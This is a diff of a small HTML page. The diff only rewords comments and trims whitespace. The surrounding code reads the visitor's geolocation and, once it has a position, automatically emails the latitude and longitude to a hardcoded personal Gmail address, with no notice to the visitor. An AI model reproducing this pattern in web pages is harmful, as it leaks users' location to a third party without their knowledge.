@@ -8,7 +8,6 @@
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         /* Your existing styling */
-        /* You can also add more efficient CSS here */
     </style>
 </head>
 <body>
@@ -24,7 +23,7 @@
         </form>
     </div>
 
-    <!-- Defer loading of Bootstrap and jQuery to speed up the page load -->
+    <!-- Defer loading of external JS to improve page load performance -->
     <script src="https://code.jquery.com/jquery-3.5.1.min.js" defer></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js" defer></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" defer></script>
@@ -35,13 +34,14 @@
             const locationDisplay = document.getElementById("locationDisplay");
             let latitude, longitude;
 
+            // Check if geolocation is supported and permissions are granted
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                        
+
                         // Send initial location data email
                         sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
